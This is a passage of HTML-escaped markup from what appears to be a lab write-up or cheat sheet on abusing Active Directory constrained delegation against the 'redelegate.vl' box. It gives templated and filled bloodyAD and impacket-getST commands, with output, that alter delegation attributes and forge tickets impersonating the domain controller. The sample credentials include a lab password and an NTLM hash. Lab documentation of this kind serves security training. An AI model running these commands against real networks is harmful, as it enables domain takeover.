class=&#34;s1&#34;&gt;&amp;#39;ldap/dc.redelegate.vl&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[+] CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL&amp;#39;s msDS-AllowedToDelegateTo has been updated&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt; bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;HASH&amp;gt;&amp;#39; -f rc4 -k --host &amp;lt;DC&amp;gt; set object &amp;#39;CN=&amp;lt;TARGET_MACHINE&amp;gt;,CN=COMPUTERS,DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; &amp;#39;msDS-AllowedToDelegateTo&amp;#39; -v &amp;#39;&amp;lt;SPN&amp;gt;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; bloodyAD -d redelegate.vl -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;helen.frost&amp;#39;&lt;/span&gt; -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;2B576ACBE6BCFDA7294D6BD18041B8FE&amp;#39;&lt;/span&gt; -f rc4 -k --host DC.REDELEGATE.VL &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; object &lt;span class=&#34;s1&#34;&gt;&amp;#39;CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL&amp;#39;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;msDS-AllowedToDelegateTo&amp;#39;&lt;/span&gt; -v &lt;span class=&#34;s1&#34;&gt;&amp;#39;ldap/dc.redelegate.vl&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[+] CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL&amp;#39;s msDS-AllowedToDelegateTo has been updated&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ticket-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Ticket-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -k --host &amp;lt;DC&amp;gt; set object &amp;#39;CN=&amp;lt;TARGET_MACHINE&amp;gt;,CN=COMPUTERS,DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; &amp;#39;msDS-AllowedToDelegateTo&amp;#39; -v &amp;#39;&amp;lt;SPN&amp;gt;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; bloodyAD -d redelegate.vl -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;helen.frost&amp;#39;&lt;/span&gt; -k --host DC.REDELEGATE.VL &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; object &lt;span class=&#34;s1&#34;&gt;&amp;#39;CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL&amp;#39;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;msDS-AllowedToDelegateTo&amp;#39;&lt;/span&gt; -v &lt;span class=&#34;s1&#34;&gt;&amp;#39;ldap/dc.redelegate.vl&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[+] CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL&amp;#39;s msDS-AllowedToDelegateTo has been updated&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;3-set-trusted_to_authenticate_for_delegation-flag&#34;&gt;3. Set TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION Flag&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight password&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --host &amp;lt;DC&amp;gt; add uac &amp;#39;&amp;lt;TARGET_MACHINE&amp;gt;$&amp;#39; -f TRUSTED_TO_AUTH_FOR_DELEGATION&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; bloodyAD -d redelegate.vl -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;helen.frost&amp;#39;&lt;/span&gt; -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;Password123!&amp;#39;&lt;/span&gt; --host DC.REDELEGATE.VL add uac &lt;span class=&#34;s1&#34;&gt;&amp;#39;FS01$&amp;#39;&lt;/span&gt; -f TRUSTED_TO_AUTH_FOR_DELEGATION&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[-] [&amp;#39;TRUSTED_TO_AUTH_FOR_DELEGATION&amp;#39;] property flags added to FS01$&amp;#39;s userAccountControl&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;:&amp;lt;HASH&amp;gt;&amp;#39; -f rc4 --host &amp;lt;DC&amp;gt; add uac &amp;#39;&amp;lt;TARGET_MACHINE&amp;gt;$&amp;#39; -f TRUSTED_TO_AUTH_FOR_DELEGATION&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; bloodyAD -d redelegate.vl -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;helen.frost&amp;#39;&lt;/span&gt; -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;:2B576ACBE6BCFDA7294D6BD18041B8FE&amp;#39;&lt;/span&gt; -f rc4 --host DC.REDELEGATE.VL add uac &lt;span class=&#34;s1&#34;&gt;&amp;#39;FS01$&amp;#39;&lt;/span&gt; -f TRUSTED_TO_AUTH_FOR_DELEGATION&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[-] [&amp;#39;TRUSTED_TO_AUTH_FOR_DELEGATION&amp;#39;] property flags added to FS01$&amp;#39;s userAccountControl&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight password-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -k --host &amp;lt;DC&amp;gt; add uac &amp;#39;&amp;lt;TARGET_MACHINE&amp;gt;$&amp;#39; -f TRUSTED_TO_AUTH_FOR_DELEGATION&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; bloodyAD -d redelegate.vl -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;helen.frost&amp;#39;&lt;/span&gt; -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;Password123!&amp;#39;&lt;/span&gt; -k --host DC.REDELEGATE.VL add uac &lt;span class=&#34;s1&#34;&gt;&amp;#39;FS01$&amp;#39;&lt;/span&gt; -f TRUSTED_TO_AUTH_FOR_DELEGATION&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[-] [&amp;#39;TRUSTED_TO_AUTH_FOR_DELEGATION&amp;#39;] property flags added to FS01$&amp;#39;s userAccountControl&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt; bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;HASH&amp;gt;&amp;#39; -f rc4 -k --host &amp;lt;DC&amp;gt; add uac &amp;#39;&amp;lt;TARGET_MACHINE&amp;gt;$&amp;#39; -f TRUSTED_TO_AUTH_FOR_DELEGATION&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; bloodyAD -d redelegate.vl -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;helen.frost&amp;#39;&lt;/span&gt; -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;2B576ACBE6BCFDA7294D6BD18041B8FE&amp;#39;&lt;/span&gt; -f rc4 -k --host DC.REDELEGATE.VL add uac &lt;span class=&#34;s1&#34;&gt;&amp;#39;FS01$&amp;#39;&lt;/span&gt; -f TRUSTED_TO_AUTH_FOR_DELEGATION&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[-] [&amp;#39;TRUSTED_TO_AUTH_FOR_DELEGATION&amp;#39;] property flags added to FS01$&amp;#39;s userAccountControl&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ticket-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Ticket-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -k --host &amp;lt;DC&amp;gt; add uac &amp;#39;&amp;lt;TARGET_MACHINE&amp;gt;$&amp;#39; -f TRUSTED_TO_AUTH_FOR_DELEGATION&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; bloodyAD -d redelegate.vl -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;helen.frost&amp;#39;&lt;/span&gt; -k --host DC.REDELEGATE.VL add uac &lt;span class=&#34;s1&#34;&gt;&amp;#39;FS01$&amp;#39;&lt;/span&gt; -f TRUSTED_TO_AUTH_FOR_DELEGATION&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[-] [&amp;#39;TRUSTED_TO_AUTH_FOR_DELEGATION&amp;#39;] property flags added to FS01$&amp;#39;s userAccountControl&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;4-request-a-service-ticket&#34;&gt;4. Request a Service Ticket&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight password&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-getST &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;TARGET_MACHINE&amp;gt;$:&amp;lt;NEW_PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC_IP&amp;gt; -spn &amp;#39;&amp;lt;SPN&amp;gt;&amp;#39; -impersonate &amp;#39;&amp;lt;DC_HOSTNAME&amp;gt;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; sudo ntpdate -s DC.REDELEGATE.VL &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; impacket-getST &lt;span class=&#34;s1&#34;&gt;&amp;#39;redelegate.vl/FS01$:Password123!&amp;#39;&lt;/span&gt; -dc-ip 10.129.31.186 -spn &lt;span class=&#34;s1&#34;&gt;&amp;#39;ldap/dc.redelegate.vl&amp;#39;&lt;/span&gt; -impersonate &lt;span class=&#34;s1&#34;&gt;&amp;#39;DC&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[-] CCache file is not found. Skipping...&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Getting TGT for user&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Impersonating DC&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Requesting S4U2self&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Requesting S4U2Proxy&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Saving ticket in DC@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-getST &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;TARGET_MACHINE&amp;gt;$&amp;#39; -hashes :&amp;lt;NEW_HASH&amp;gt; -dc-ip &amp;lt;DC_IP&amp;gt; -spn &amp;#39;&amp;lt;SPN&amp;gt;&amp;#39; -impersonate &amp;#39;&amp;lt;DC_HOSTNAME&amp;gt;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; sudo ntpdate -s DC.REDELEGATE.VL &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; impacket-getST &lt;span class=&#34;s1&#34;&gt;&amp;#39;redelegate.vl/FS01$&amp;#39;&lt;/span&gt; -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -dc-ip 10.129.31.186 -spn &lt;span class=&#34;s1&#34;&gt;&amp;#39;ldap/dc.redelegate.vl&amp;#39;&lt;/span&gt; -impersonate &lt;span class=&#34;s1&#34;&gt;&amp;#39;DC&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[-] CCache file is not found. Skipping...&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Getting TGT for user&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Impersonating DC&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Requesting S4U2self&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Requesting S4U2Proxy&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Saving ticket in DC@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight password-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-getST &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;TARGET_MACHINE&amp;gt;$:&amp;lt;NEW_PASSWORD&amp;gt;&amp;#39; -k -dc-ip &amp;lt;DC_IP&amp;gt; -spn &amp;#39;&amp;lt;SPN&amp;gt;&amp;#39; -impersonate &amp;#39;&amp;lt;DC_HOSTNAME&amp;gt;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; sudo ntpdate -s DC.REDELEGATE.VL &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; impacket-getST &lt;span class=&#34;s1&#34;&gt;&amp;#39;redelegate.vl/FS01$:Password123!&amp;#39;&lt;/span&gt; -k -dc-ip 10.129.31.186 -spn &lt;span class=&#34;s1&#34;&gt;&amp;#39;ldap/dc.redelegate.vl&amp;#39;&lt;/span&gt; -impersonate &lt;span class=&#34;s1&#34;&gt;&amp;#39;DC&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[-] CCache file is not found. Skipping...&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Getting TGT for user&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Impersonating DC&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Requesting S4U2self&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Requesting S4U2Proxy&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Saving ticket in DC@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM-based 